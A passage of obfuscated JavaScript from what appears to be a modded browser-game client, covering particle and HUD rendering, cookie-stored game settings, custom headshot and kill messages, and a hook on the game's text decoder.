              Df: _0x2c22d1.V(0, _0x3c7003.F),
              Ef: _0x2c22d1.V(0.09, 0.16) * 0.66,
              Ff: _0x2c22d1.V(0, 1),
              Gf: _0x2c22d1.V(0, 1),
              Hf: 0,
              yf: _0xe4b8ac[0],
              zf: _0xe4b8ac[1],
              Af: _0xe4b8ac[2]
            };
          }
          this.If();
          this.Jf();
        };
        _0x2059a0.hd = false;
        _0x2059a0.Kf = function (_0x1164bb) {
          _0x2059a0.hd = _0x1164bb;
        };
        _0x2059a0.prototype.Lf = function (_0x4846d5) {
          this.hf.Kf(_0x4846d5);
        };
        _0x2059a0.prototype.Jf = function () {
          var _0x1ac12c = window.devicePixelRatio ? window.devicePixelRatio : 1;
          this.ff = this.ef.width();
          this.gf = this.ef.height();
          this.lf.resize(this.ff, this.gf);
          this.lf.resolution = _0x1ac12c;
          this.Eb.width = _0x1ac12c * this.ff;
          this.Eb.height = _0x1ac12c * this.gf;
          var _0x233dab = Math.max(this.ff, this.gf) * 0.6;
          for (var _0x56c07a = 0; _0x56c07a < this.vf.length; _0x56c07a++) {
            this.vf[_0x56c07a].width = _0x233dab;
            this.vf[_0x56c07a].height = _0x233dab;
          }
        };
        _0x2059a0.prototype.Nf = function (_0x1bd189, _0x3a3e20) {
          if (_0x2059a0.hd) {
            var _0x2cfed6 = _0x1bd189 / 1000;
            var _0x5ae88b = _0x3a3e20 / 1000;
            var _0x35f287 = this.ef.width();
            var _0x8c2b02 = this.ef.height();
            for (var _0x4f6d50 = 0; _0x4f6d50 < this.vf.length; _0x4f6d50++) {
              var _0x5a158d = _0x1e2901[_0x4f6d50 % _0x1e2901.length];
              var _0x1d0d90 = this.vf[_0x4f6d50];
              var _0x365cf6 = _0x4f6d50 / this.vf.length * _0x3c7003.G;
              var _0x594420 = _0x2cfed6 * 0.5 * 0.12;
              var _0x596a56 = Math.cos((_0x594420 + _0x365cf6) * 3) * Math.cos(_0x365cf6) - Math.sin((_0x594420 + _0x365cf6) * 5) * Math.sin(_0x365cf6);
              var _0x794455 = Math.cos((_0x594420 + _0x365cf6) * 3) * Math.sin(_0x365cf6) + Math.sin((_0x594420 + _0x365cf6) * 5) * Math.cos(_0x365cf6);
              var _0x53ca17 = 0.2 + Math.cos(_0x365cf6 + _0x2cfed6 * 0.075) * 0.2;
              var _0x332659 = _0x5a158d.Af * 255 << 16 & 16711680 | _0x5a158d.zf * 255 << 8 & 65280 | _0x5a158d.yf * 255 & 255;
              _0x1d0d90.tint = _0x332659;
              _0x1d0d90.alpha = _0x53ca17;
              _0x1d0d90.position.set(_0x35f287 * (0.2 + (_0x596a56 + 1) * 0.5 * 0.6), _0x8c2b02 * (0.1 + (_0x794455 + 1) * 0.5 * 0.8));
            }
            var _0x1210fe = Math.max(_0x35f287, _0x8c2b02) * 0.05;
            for (var _0x1ebda9 = 0; _0x1ebda9 < this.wf.length; _0x1ebda9++) {
              var _0x75e0e2 = this.xf[_0x1ebda9];
              var _0x4d2b2d = this.wf[_0x1ebda9];
              var _0x9699f = _0x3c7003.F * _0x1ebda9 / this.wf.length + _0x75e0e2.Df;
              _0x75e0e2.Gf += _0x75e0e2.Ef * _0x5ae88b;
              if (_0x75e0e2.Gf > 1.1) {
                _0x75e0e2.Df = Math.random() * _0x3c7003.F;
                _0x75e0e2.Ef = (0.09 + Math.random() * 0.07) * 0.66;
                _0x75e0e2.Ff = 0.15 + Math.random() * 0.7;
                _0x75e0e2.Gf = -0.1;
              }
              var _0x40d231 = _0x75e0e2.Ff + Math.sin(Math.sin(_0x9699f + _0x2cfed6 * 0.48) * 6) * 0.03;
              var _0x1f6ebb = _0x75e0e2.Gf;
              var _0x46dcc5 = (0.4 + (1 + Math.sin(_0x9699f + _0x2cfed6 * 0.12)) * 0.5 * 1.2) * 0.5;
              var _0x2de873 = _0x9699f + _0x75e0e2.Ef * 2 * _0x2cfed6;
              var _0x157916 = _0x2c22d1.P(Math.sin(Math.PI * _0x1f6ebb), 0.1, 1);
              var _0x209008 = _0x75e0e2.zf * 255 << 8 & 65280 | _0x75e0e2.Af * 255 << 16 & 16711680 | _0x75e0e2.yf * 255 & 255;
              _0x4d2b2d.alpha = _0x157916;
              _0x4d2b2d.tint = _0x209008;
              _0x4d2b2d.position.set(_0x35f287 * _0x40d231, _0x8c2b02 * _0x1f6ebb);
              _0x4d2b2d.rotation = _0x2de873;
              var _0x1e5bd1 = _0x4d2b2d.texture.width / _0x4d2b2d.texture.height;
              _0x4d2b2d.width = _0x46dcc5 * _0x1210fe;
              _0x4d2b2d.height = _0x46dcc5 * _0x1210fe * _0x1e5bd1;
            }
            this.Of();
            this.lf.render(this.mf, null, true);
          }
        };
        _0x2059a0.prototype.Pf = function () {
          var _0x4b1ffd = _0xe610a0();
          if (_0x4b1ffd.Lc.Wb()) {
            var _0x2f76c9 = _0x4b1ffd.Lc.Ub().gb(_0x3f1ee3);
            for (var _0x89dcf3 = 0; _0x89dcf3 < _0x3f1ee3; _0x89dcf3++) {
              this.hf.Qf(_0x89dcf3, _0x2f76c9[_0x89dcf3]);
            }
          } else {
            var _0x1ee887 = _0x2c22d1.V(0, 1);
            for (var _0x13d1a0 = 0; _0x13d1a0 < _0x3f1ee3; _0x13d1a0++) {
              var _0x3372d0 = (_0x1ee887 + _0x13d1a0 / _0x3f1ee3) % 1;
              var _0xd7038d = _0x2c22d1.Y(Math.floor(_0x3372d0 * 360), 0.85, 0.5);
              var _0x4a1170 = _0xd7038d[0] * 255 & 255 | _0xd7038d[1] * 255 << 8 & 65280 | _0xd7038d[2] * 255 << 16 & 16711680;
              var _0x423c8e = "000000" + _0x4a1170.toString(16);
              _0x423c8e = "#" + _0x423c8e.substring(_0x423c8e.length - 6, _0x423c8e.length);
              this.hf.Rf(_0x13d1a0, _0x423c8e);
            }
          }
        };
        _0x2059a0.prototype.If = function () {
          var _0x151523 = Math.min(this.ff, this.gf);
          var _0x2870d7 = Date.now();
          for (var _0x439461 = 0; _0x439461 < _0x3f1ee3; _0x439461++) {
            var _0x557334 = _0x439461 / _0x3f1ee3 * _0x3c7003.F;
            var _0x4838d2 = _0x5072ab(_0x2870d7, 0.12, _0x557334);
            _0x4838d2.qa = _0x4838d2.qa * 4;
            _0x4838d2.ra = _0x4838d2.ra * 4;
            this.hf.Sf(_0x439461, (this.ff + _0x4838d2.qa * _0x151523) * 0.5, (this.gf + _0x4838d2.ra * _0x151523) * 0.5);
          }
        };
        _0x2059a0.prototype.Of = function () {
          var _0x11faba = Math.min(this.ff, this.gf);
          var _0x4a8990 = Date.now();
          for (var _0x58b632 = 0; _0x58b632 < _0x3f1ee3; _0x58b632++) {
            var _0x49dc97 = _0x58b632 / _0x3f1ee3 * _0x3c7003.F;
            var _0x42d82d = _0x5072ab(_0x4a8990, 0.12, _0x49dc97);
            this.hf.Tf(_0x58b632, (this.ff + _0x42d82d.qa * _0x11faba) * 0.5, (this.gf + _0x42d82d.ra * _0x11faba) * 0.5);
          }
          this.hf.Uf();
        };
        var _0x5072ab = function _0x21f668(_0x1c2c56, _0x48fa0c, _0xe58e4) {
          var _0x224284 = _0x1c2c56 / 1000;
          return {
            qa: (Math.cos(_0x48fa0c * _0x224284 + _0xe58e4) + Math.cos(_0x48fa0c * -32 * _0x224284 + _0xe58e4) * 0.4 + Math.cos(_0x48fa0c * 7 * _0x224284 + _0xe58e4) * 0.7) * 0.8,
            ra: (Math.sin(_0x48fa0c * _0x224284 + _0xe58e4) + Math.sin(_0x48fa0c * -32 * _0x224284 + _0xe58e4) * 0.4 + Math.sin(_0x48fa0c * 7 * _0x224284 + _0xe58e4) * 0.7) * 0.8
          };
        };
        return _0x2059a0;
      }();
      _0x31b4a1.Vf = function () {
        function _0x448751() {}
        _0x448751.Wf = "consent_state_2";
        _0x448751.Xf = "showPlayerNames";
        _0x448751.Yf = "musicEnabled";
        _0x448751.Zf = "sfxEnabled";
        _0x448751.$f = "account_type";
        _0x448751._f = "gameMode";
        _0x448751.ag = "nickname";
        _0x448751.bg = "skin";
        _0x448751.cg = "prerollCount";
        _0x448751.dg = "shared";
        _0x448751.eg = function (_0x2c5bf7, _0x5c1c3d, _0x1d0451) {
          var _0x18aa85 = new Date();
          _0x18aa85.setTime(_0x18aa85.getTime() + _0x1d0451 * 86400000);
          var _0x35d0ee = "expires=" + _0x18aa85.toUTCString();
          document.cookie = _0x2c5bf7 + "=" + _0x5c1c3d + "; " + _0x35d0ee;
        };
        _0x448751.fg = function (_0x927253) {
          var _0x322439 = _0x927253 + "=";
          for (var _0x3f6d4f = document.cookie.split(";"), _0x2d8daa = 0; _0x2d8daa < _0x3f6d4f.length; _0x2d8daa++) {
            for (var _0x1dd132 = _0x3f6d4f[_0x2d8daa]; _0x1dd132.charAt(0) == " ";) {
              _0x1dd132 = _0x1dd132.substring(1);
            }
            if (_0x1dd132.indexOf(_0x322439) == 0) {
              if (_0x927253 == "nickname=") {
                _0x1dd132.substring(_0x322439.length, _0x1dd132.length).substring(0, _0xff4a8c);
              }
              return _0x1dd132.substring(_0x322439.length, _0x1dd132.length);
            }
          }
          return "";
        };
        return _0x448751;
      }();
      _0x3c7003.gg = function () {
        function _0x1f993d(_0x305406, _0x32b2d7, _0xa322bb) {
          var _0x2e9bb4 = false;
          for (var _0x4b5f45 = _0xa322bb.length, _0x1cf8fc = 0, _0x5c92da = _0x4b5f45 - 1; _0x1cf8fc < _0x4b5f45; _0x5c92da = _0x1cf8fc++) {
            if (_0xa322bb[_0x1cf8fc][1] > _0x32b2d7 != _0xa322bb[_0x5c92da][1] > _0x32b2d7 && _0x305406 < (_0xa322bb[_0x5c92da][0] - _0xa322bb[_0x1cf8fc][0]) * (_0x32b2d7 - _0xa322bb[_0x1cf8fc][1]) / (_0xa322bb[_0x5c92da][1] - _0xa322bb[_0x1cf8fc][1]) + _0xa322bb[_0x1cf8fc][0]) {
              _0x2e9bb4 = !_0x2e9bb4;
            }
          }
          return _0x2e9bb4;
        }
        var _0x4dbd6e = [[-28.06744, 64.95936], [-10.59082, 72.91964], [14.11773, 81.39558], [36.51855, 81.51827], [32.82715, 71.01696], [31.64063, 69.41897], [29.41419, 68.43628], [30.64379, 67.47302], [29.88281, 66.76592], [30.73975, 65.50385], [30.73975, 64.47279], [31.48682, 63.49957], [32.18994, 62.83509], [28.47726, 60.25122], [28.76221, 59.26588], [28.03711, 58.60833], [28.38867, 57.53942], [28.83955, 56.2377], [31.24512, 55.87531], [31.61865, 55.34164], [31.92627, 54.3037], [33.50497, 53.26758], [32.73926, 52.85586], [32.23389, 52.4694], [34.05762, 52.44262], [34.98047, 51.79503], [35.99121, 50.88917], [36.67236, 50.38751], [37.74902, 50.51343], [40.78125, 49.62495], [40.47363, 47.70976], [38.62799, 46.92028], [37.53193, 46.55915], [36.72182, 44.46428], [39.68218, 43.19733], [40.1521, 43.74422], [43.52783, 43.03678], [45.30762, 42.73087], [46.99951, 41.98399], [47.26318, 40.73061], [44.20009, 40.86309], [45.35156, 39.57182], [45.43945, 36.73888], [35.64789, 35.26481], [33.13477, 33.65121], [21.47977, 33.92486], [12.16268, 34.32477], [11.82301, 37.34239], [6.09112, 38.28597], [-1.96037, 35.62069], [-4.82156, 35.60443], [-7.6498, 35.26589], [-16.45237, 37.44851], [-28.06744, 64.95936]];
        return {
          hg: function _0x297b4a(_0x5cd02e, _0x1f8e63) {
            return _0x1f993d(_0x1f8e63, _0x5cd02e, _0x4dbd6e);
          }
        };
      }();
      _0x31b4a1.ig = function () {
        function _0x48a481(_0x471ebd) {
          var _0x337fc9 = undefined;
          _0x337fc9 = _0x471ebd > 0 ? "+" + Math.floor(_0x471ebd) : _0x471ebd < 0 ? "-" + Math.floor(_0x471ebd) : "0";
          var _0x56548c = Math.min(1.5, 0.5 + _0x471ebd / 600);
          var _0x17c6ee = undefined;
          if (_0x471ebd < 1) {
            _0x17c6ee = "0xFFFFFF";
          } else if (_0x471ebd < 30) {
            var _0x1b2a1f = (_0x471ebd - 1) / 29;
            _0x17c6ee = _0x2eb680((1 - _0x1b2a1f) * 1 + _0x1b2a1f * 0.96, (1 - _0x1b2a1f) * 1 + _0x1b2a1f * 0.82, (1 - _0x1b2a1f) * 1 + _0x1b2a1f * 0);
          } else if (_0x471ebd < 300) {
            var _0xc6ee03 = (_0x471ebd - 30) / 270;
            _0x17c6ee = _0x2eb680((1 - _0xc6ee03) * 0.96 + _0xc6ee03 * 0.93, (1 - _0xc6ee03) * 0.82 + _0xc6ee03 * 0.34, (1 - _0xc6ee03) * 0 + _0xc6ee03 * 0.25);
          } else if (_0x471ebd < 700) {
            var _0x3b7a71 = (_0x471ebd - 300) / 400;
            _0x17c6ee = _0x2eb680((1 - _0x3b7a71) * 0.93 + _0x3b7a71 * 0.98, (1 - _0x3b7a71) * 0.34 + _0x3b7a71 * 0, (1 - _0x3b7a71) * 0.25 + _0x3b7a71 * 0.98);
          } else {
            _0x17c6ee = _0x2eb680(0.98, 0, 0.98);
          }
          var _0x4bdc1d = Math.random();
          var _0x4b686b = 1 + Math.random() * 0.5;
          return new _0x46b16f(_0x337fc9, _0x17c6ee, true, 0.5, _0x56548c, _0x4bdc1d, _0x4b686b);
        }
        function _0x58381a(_0x42e646, _0x1da09a) {
          var _0x5dc352 = undefined;
          var _0x293a67 = undefined;
          if (_0x1da09a) {
            _0x5dc352 = 1.3;
            _0x293a67 = _0x2eb680(0.93, 0.34, 0.25);
          } else {
            _0x5dc352 = 1.1;
            _0x293a67 = _0x2eb680(0.96, 0.82, 0);
          }
          return new _0x46b16f(_0x42e646, _0x293a67, true, 0.5, _0x5dc352, 0.5, 0.7);
        }
        function _0x2eb680(_0x218874, _0x488a66, _0xb51561) {
          return ((_0x218874 * 255 & 255) << 16) + ((_0x488a66 * 255 & 255) << 8) + (_0xb51561 * 255 & 255);
        }
        var _0x212937 = _0x2c22d1.M(_0x131478.Container, function () {
          _0x131478.Container.call(this);
          this.jg = [];
          this.kg = 0;
        });
        _0x212937.prototype.lg = function (_0x19879c) {
          this.kg += _0x19879c;
          if (this.kg >= 1) {
            var _0x3f10cc = Math.floor(this.kg);
            this.kg -= _0x3f10cc;
            var _0x2c8b49 = _0x48a481(_0x3f10cc);
            this.addChild(_0x2c8b49);
            this.jg.push(_0x2c8b49);
          }
        };
        _0x212937.prototype.mg = function (_0x24c732, _0x2c44c6) {
          _wup.fnSetCounts("count", _0x24c732);
          if (_0x24c732) {
            if (!(window.vps.headshot % 10)) {
              _0x5bab76.fxdo("monsterKillSound");
            } else {
              _0x5bab76.fxdo("headshot");
            }
            const _0x43315c = window.createCustomMessage(true, _0x2c44c6);
            var _0x1bdf21 = _0x58381a(_0x43315c, true);
            this.addChild(_0x1bdf21);
            this.jg.push(_0x1bdf21);
          } else {
            const _0xbb4362 = window.createCustomMessage(false, _0x2c44c6);
            var _0x5808c1 = _0x58381a(_0xbb4362, false);
            this.addChild(_0x5808c1);
            this.jg.push(_0x5808c1);
          }
        };
        (function () {
          const _0x3fdafe = window.decoder?.H;
          if (_0x3fdafe && window.decoder) {
            window.decoder.H = function (_0x200513) {
              const _0x14927b = _0x3fdafe.call(this, _0x200513);
              if (_0x200513 === "index.game.floating.headshot") {
                const _0x4e509c = window.getLastKilledPlayerName ? window.getLastKilledPlayerName() : null;
                return window.createCustomMessage(true, _0x4e509c);
              } else if (_0x200513 === "index.game.floating.wellDone") {
                const _0x34054a = window.getLastKilledPlayerName ? window.getLastKilledPlayerName() : null;
                return window.createCustomMessage(false, _0x34054a);
              }
              return _0x14927b;
            };
          }
        })();
        window.createCustomMessage = function (_0x4b7a6d, _0xcf865d) {
          if (!window.vps || !window.vps.messageSettings) {
            if (_0x4b7a6d) {
              return "HEADSHOT";
            } else {
              return "Well Done!";
            }
          }
          const _0x43ab58 = window.vps.messageSettings;
          if (_0x43ab58.defaultMessages) {
            if (_0x4b7a6d) {
              return "HEADSHOT";
            } else {
              return "Well Done!";
            }
          }
          let _0x1091c9;
          let _0x5e507f;
          let _0x440559;
          if (_0x4b7a6d) {
            if (_0x43ab58.headshotMsgType === "custom" && _0x43ab58.headshotCustomText) {
              _0x1091c9 = _0x43ab58.headshotCustomText;
            } else {
              _0x1091c9 = _0x43ab58.headshotMsg || "HEADSHOT";
            }
            _0x5e507f = _0x43ab58.showHeadshotName;
            _0x440559 = _0x43ab58.headshotNamePos;
          } else {
            if (_0x43ab58.killMsgType === "custom" && _0x43ab58.killCustomText) {
              _0x1091c9 = _0x43ab58.killCustomText;
            } else {
              _0x1091c9 = _0x43ab58.killMsg || "KILLED";
            }
            _0x5e507f = _0x43ab58.showKillName;
            _0x440559 = _0x43ab58.killNamePos;
          }
          if (_0x5e507f && _0xcf865d) {
            if (_0x440559 === "before") {
              return _0xcf865d + " " + _0x1091c9;
            } else {
              return _0x1091c9 + " " + _0xcf865d;
            }
          }
          return _0x1091c9;
        };
        _0x212937.prototype.Uf = function (_0x485abe, _0x44583f) {
          var _0x207334 = _0xe610a0().og.af.ng;
          var _0x2a0195 = _0x207334.lf.width / _0x207334.lf.resolution;
          var _0x26deac = _0x207334.lf.height / _0x207334.lf.resolution;
          for (var _0x3c3cec = 0; _0x3c3cec < this.jg.length;) {
            var _0x221725 = this.jg[_0x3c3cec];
            _0x221725.pg = _0x221725.pg + _0x44583f / 2000 * _0x221725.qg;
            _0x221725.rg = _0x221725.rg + _0x44583f / 2000 * _0x221725.sg;
            _0x221725.alpha = Math.sin(Math.PI * _0x221725.rg) * 0.5;
            _0x221725.scale.set(_0x221725.pg);
            _0x221725.position.x = _0x2a0195 * (0.25 + _0x221725.tg * 0.5);
            _0x221725.position.y = _0x221725.ug ? _0x26deac * (1 - (1 + _0x221725.rg) * 0.5) : _0x26deac * (1 - (0 + _0x221725.rg) * 0.5);
            if (_0x221725.rg > 1) {
              _0x2c22d1.U(_0x221725);
              this.jg.splice(_0x3c3cec, 1);
              _0x3c3cec--;
            }
            _0x3c3cec++;
          }
        };
        var _0x46b16f = function () {
          return _0x2c22d1.M(_0x131478.Text, function (_0x541a75, _0x53ae9d, _0xfd2466, _0x23c6ae, _0x37f1de, _0x108b02, _0x5a513e) {
            _0x131478.Text.call(this, _0x541a75, {
              fill: _0x53ae9d,
              fontFamily: "PTSans",
              fontSize: 36
            });
            this.anchor.set(0.5);
            this.ug = _0xfd2466;
            this.pg = _0x23c6ae;
            this.qg = _0x37f1de;
            this.tg = _0x108b02;
            this.rg = 0;
            this.sg = _0x5a513e;
          });
        }();
        return _0x212937;
      }();
      _0x31b4a1.be = function () {
        function _0x5df04f(_0x4fcf46, _0xaead93) {
          this.Xd = _0x4fcf46;
          this.oa = _0xaead93;
        }
        return _0x5df04f;
      }();
      _0x31b4a1.Ac = {
        vg: 0,
        zc: 16
      };
      _0x31b4a1.GameParams = function () {
        function _0x3308fa() {
          this.xg = _0x31b4a1.Ac.vg;
          this.yg = 0;
          this.zg = 500;
          this.Ag = 4000;
          this.Bg = 7000;
        }
        _0x3308fa.Cg = 0;
        _0x3308fa.prototype.Dg = function () {
          return this.zg * 1.02;
        };
        return _0x3308fa;
      }();
      _0x31b4a1.Eg = function () {
        function _0x8b872b(_0x3b8fc4) {
          this.ef = _0x3b8fc4;
          this.Eb = _0x3b8fc4.get()[0];
          this.lf = new _0x131478.Renderer({
            view: _0x3b8fc4.get()[0],
            backgroundColor: _0x6c011,
            antialias: false
          });
          this.mf = new _0x131478.Container();
          this.mf.sortableChildren = true;
          this.Fg = Math.floor(Math.random() * 360);
          this.Gg = 0;
          this.Hg = 0;
          this.Ig = 15;
          this.Jg = 0.5;
          this.Kg = 0;
          this.Lg = _0x261341.Lg(_0x31b4a1);
          this.Ng = new _0x131478.Graphics();
          this.Og = new _0x131478.Container();
          this.Pg = new _0x131478.Container();
          this.Pg.sortableChildren = true;
          this.Qg = new _0x131478.Container();
          this.Rg = new _0x131478.Container();
          this.Rg.sortableChildren = true;
          this.Sg = new _0x131478.Container();
          this.Tg = new _0x13d916();
          this.Ug = new _0x5c6e4f();
          this.Vg = new _0x597da4();
          this.Wg = new _0x31b4a1.ig();
          this.Xg = new _0x131478.Sprite();
          this.Yg = {
            x: 0,
            y: 0
          };
          this.ha();
        }
        var _0x6c011 = 0;
        _0x8b872b.prototype.ha = function () {
          this.lf.backgroundColor = _0x6c011;
          this.Lg.sf.zIndex = 1;
          this.mf.addChild(this.Lg.sf);
          this.Ng.zIndex = 20;
          this.mf.addChild(this.Ng);
          this.Og.zIndex = 5000;
          this.mf.addChild(this.Og);
          this.Pg.zIndex = 5100;
          this.mf.addChild(this.Pg);
          this.Qg.zIndex = 10000;
          this.mf.addChild(this.Qg);
          createLine(this.mf, this.Lg.sf);
          this.Xg.texture = _0xe610a0().xe.Zg;
          this.Xg.anchor.set(0.5);
          this.Xg.zIndex = 1;
          this.Rg.addChild(this.Xg);
          this.Sg.alpha = 0.6;
          this.Sg.zIndex = 2;
          this.Rg.addChild(this.Sg);
          this.Wg.zIndex = 3;
          this.Rg.addChild(this.Wg);
          this.Tg.alpha = 0.8;
          this.Tg.zIndex = 4;
          this.Rg.addChild(this.Tg);
          this.Ug.zIndex = 5;
          this.Rg.addChild(this.Ug);
          this.Vg.zIndex = 6;
          this.Rg.addChild(this.Vg);
          this.Jf();
        };
        _0x8b872b.prototype.Jf = function () {
          var _0xd1372c = 0;
          var _0x2d4e9b = 0;
          var _0x962557 = this.ef.width() - 245;
          var _0x2312db = 1;
          var _0xa36640 = 0;
          var _0x16a6f4 = 0;
          var _0x3ffdfe = this.ef.width();
          var _0x4cf645 = this.ef.height();
          var _0xb3f769 = window.devicePixelRatio ? window.devicePixelRatio : 1;
          var _0x3cb342 = _0xb3f769 * _0x3ffdfe;
          var _0x1f02c9 = _0xb3f769 * _0x4cf645;
          var _0x53f867 = Math.min(Math.min(_0x3ffdfe, _0x4cf645), Math.max(_0x3ffdfe, _0x4cf645) * 0.625);
          this.lf.resize(_0x3ffdfe, _0x4cf645);
          this.lf.resolution = _0xb3f769;
          this.Eb.width = _0x3cb342;
          this.Eb.height = _0x1f02c9;
          this.Jg = _0x53f867;
          this.Xg.position.set(_0x3ffdfe / 2, _0x4cf645 / 2);
          this.Xg.width = _0x3ffdfe;
          this.Xg.height = _0x4cf645;
          var _0x59d2bc = this.ef.width();
          var _0xba58ff = vps.hudSettings.mode == 0 ? 60 + _0xd1372c : _0x59d2bc / 2 + (60 + _0xd1372c) - _0x59d2bc * vps.hudSettings.wi;
          var _0x4268df = vps.hudSettings.mode == 0 ? 110 : _0x59d2bc / 2 + 110 - _0x59d2bc * vps.hudSettings.wi;
          var _0x418706 = vps.hudSettings.mode == 0 ? this.ef.width() - 245 : _0x59d2bc / 2 - 225 + _0x59d2bc * vps.hudSettings.wi - 50;
          this.Tg.position.set(_0xba58ff, 60 + _0x2d4e9b + (_0xa36640 ? this.Tg.height / 4 : 0));
          this.Ug.position.set(_0x4268df, 10);
          this.Vg.position.set(_0x418706, _0x2312db + (_0x16a6f4 ? this.Vg.height : 0));
          if (ctxx.labelRoom) {
            if (ctxx.labelRoom.parent) {
              ctxx.labelRoom.parent.removeChild(ctxx.labelRoom);
            }
            if (this.Tg.parent) {
              this.Tg.parent.addChild(ctxx.labelRoom);
            }
            var _0x167076;
            if (vps.hudSettings.mode == 0) {
              _0x167076 = _0x59d2bc - 120;
            } else if (vps.hudSettings.mode == 1) {
              _0x167076 = _0x59d2bc / 2 - 120 + _0x59d2bc * vps.hudSettings.wi + -15;
            } else {
              _0x167076 = _0x59d2bc / 2 - 120 + -10;
            }
            ctxx.labelRoom.position.x = _0x167076 - 8;
            ctxx.labelRoom.position.y = 1;
            ctxx.labelRoom.visible = true;
          }
          this.Tg.rotation = _0xa36640;
          this.Vg.rotation = _0x16a6f4;
        };
        _0x8b872b.prototype.Uf = function (_0x275476, _0x4fa33a) {
          var _0x595009 = _0x380234;
          this.Ig = 15;
          this.Og.removeChildren();
          this.Pg.removeChildren();
          this.Qg.removeChildren();
          this.Sg.removeChildren();
          this.Lg.$g(_0x275476.xg === _0x31b4a1.Ac.vg ? _0x595009.xe._g : _0x595009.xe.ah);
          var _0x2f423 = this.Ng;
          _0x2f423.clear();
          _0x2f423.lineStyle(0.2, 16711680, 0.3);
          _0x2f423.drawCircle(0, 0, _0x275476.zg);
          _0x2f423.endFill();
          this.Vg.bh = _0x4fa33a;
          this.Sg.visible = _0x4fa33a;
        };
        _0x8b872b.prototype.Nf = function (_0x4d6403, _0x449bc9) {
          if (this.lf.width <= 5) {
            return;
          }
          var _0x3c0a8b = _0x380234;
          var _0x3cc099 = _0x3c0a8b.dh.ch;
          var _0x2a6e41 = this.lf.width / this.lf.resolution;
          var _0x2f98c1 = this.lf.height / this.lf.resolution;
          this.Ig = _0x261341.$F.Q(this.Ig, _0x3c0a8b.dh.eh, _0x449bc9, 0.002);
          var _0x3fb47a = this.Jg / (this.Ig * _0x1de86b);
          var _0x5a09d8 = _0x3c0a8b.dh.ch.dd[_0x261341.$C.fd.qd];
          var _0x122df6 = _0x5a09d8 != null && _0x5a09d8.hd;
          this.Kg = _0x261341.$F.P(this.Kg + _0x449bc9 / 1000 * ((_0x122df6 ? 1 : 0) * 0.1 - this.Kg), 0, 1);
          this.Xg.alpha = this.Kg;
          this.Fg = (this.Fg + _0x449bc9 * 0.01) % 360;
          this.Gg = Math.sin(_0x4d6403 / 1200 * 2 * Math.PI);
          var _0x2299fc = _0x3cc099.fh();
          this.Yg.x = _0x261341.$F.R(this.Yg.x, _0x2299fc.x, _0x449bc9, window.vps.smoothCamera, 33.333);
          this.Yg.y = _0x261341.$F.R(this.Yg.y, _0x2299fc.y, _0x449bc9, 0.5, 33.333);
          var _0x3c278d = _0x2a6e41 / _0x3fb47a / 2;
          var _0x2d090f = _0x2f98c1 / _0x3fb47a / 2;
          _0x3c0a8b.dh.gh(this.Yg.x - _0x3c278d * 1.3, this.Yg.x + _0x3c278d * 1.3, this.Yg.y - _0x2d090f * 1.3, this.Yg.y + _0x2d090f * 1.3);
          if (!vps.backgroundMap) {
            this.Lg.Uf(this.Yg.x, this.Yg.y, _0x3c278d * 2, _0x2d090f * 2);
          }
          var _0xe10260 = _0x3c0a8b.dh.hh.zg;
          this.mf.scale.set(_0x3fb47a, _0x3fb47a);
          this.mf.position.set(_0x2a6e41 / 2 - this.Yg.x * _0x3fb47a, _0x2f98c1 / 2 - this.Yg.y * _0x3fb47a);
          var _0x2dde68 = Math.hypot(_0x2299fc.x, _0x2299fc.y);
          if (_0x2dde68 > _0xe10260 - 10) {
            this.Hg = _0x261341.$F.P(1 + (_0x2dde68 - _0xe10260) / 10, 0, 1);
            var _0x2e28b5 = Math.cos(this.Fg * _0x261341.$V.F / 360) * (1 - this.Hg) + this.Hg * 1;
            var _0x3d641a = Math.sin(this.Fg * _0x261341.$V.F / 360) * (1 - this.Hg);
            var _0x56fe46 = (Math.atan2(_0x3d641a, _0x2e28b5) + _0x261341.$V.F) % _0x261341.$V.F * 360 / _0x261341.$V.F;
            var _0x2c8454 = this.Hg * (0.5 + this.Gg * 0.5);
            var _0x5b6289 = _0x261341.$F.Y(Math.floor(_0x56fe46), 1, 0.75 - this.Hg * 0.25);
            this.Lg.Ec(_0x5b6289[0], _0x5b6289[1], _0x5b6289[2], 0.1 + _0x2c8454 * 0.2);
          } else {
            this.Hg = 0;
            var _0x3b60e8 = _0x261341.$F.Y(Math.floor(this.Fg), 1, 0.75);
            this.Lg.Ec(_0x3b60e8[0], _0x3b60e8[1], _0x3b60e8[2], 0.1);
          }
          for (var _0x5b06cb = 0; _0x5b06cb < this.Sg.children.length; _0x5b06cb++) {
            var _0x4b161b = this.Sg.children[_0x5b06cb];
            _0x4b161b.position.set(_0x2a6e41 / 2 - (this.Yg.x - _0x4b161b.ih.x) * _0x3fb47a, _0x2f98c1 / 2 - (this.Yg.y - _0x4b161b.ih.y) * _0x3fb47a);
          }
          this.Tg.jh.position.x = _0x2299fc.x / _0xe10260 * this.Tg.kh;
          this.Tg.jh.position.y = _0x2299fc.y / _0xe10260 * this.Tg.kh;
          _wupin.myLocation = this.Tg.jh;
          window.playerCoords = {
            x: this.Tg.jh.position.x,
            y: this.Tg.jh.position.y
          };
          this.Ug.lh(_0x4d6403);
          this.Wg.Uf(_0x4d6403, _0x449bc9);
          this.lf.render(this.mf, null, true);
          this.lf.render(this.Rg, null, false);
        };
        _0x8b872b.prototype.mh = function (_0x209e3f, _0x21a76c) {
          _0x21a76c.nh.Cc.Qc().zIndex = (_0x209e3f + 2147483648) / 4294967296 * 5000;
          this.Og.addChild(_0x21a76c.nh.Dc.Qc());
          this.Pg.addChild(_0x21a76c.nh.Cc.Qc());
        };
        _0x8b872b.prototype.oh = function (_0x192ea3, _0x368b8f, _0x1a37ea) {
          _0x368b8f.nc.zIndex = _0xe610a0().dh.hh.yg ? 0 : 10 + (_0x192ea3 + 32768) / 65536 * 5000;
          this.Qg.addChild(_0x368b8f.nc);
          if (_0x192ea3 != _0xe610a0().dh.hh.yg) {
            this.Sg.addChild(_0x1a37ea);
          }
        };
        var _0x13d916 = function () {
          return _0x2c22d1.M(_0x131478.Container, function () {
            _0x131478.Container.call(this);
            this.kh = 40;
            this.qh = new _0x131478.Sprite();
            this.qh.anchor.set(0.5);
            var _0x496f61 = new _0x131478.Graphics();
            _0x496f61.beginFill("black", 0.4);
            _0x496f61.drawCircle(0, 0, this.kh);
            _0x496f61.endFill();
            _0x496f61.lineStyle(2, 16225317);
            _0x496f61.drawCircle(0, 0, this.kh);
            _0x496f61.moveTo(0, -this.kh);
            _0x496f61.lineTo(0, +this.kh);
            _0x496f61.moveTo(-this.kh, 0);
            _0x496f61.lineTo(+this.kh, 0);
            _0x496f61.endFill();
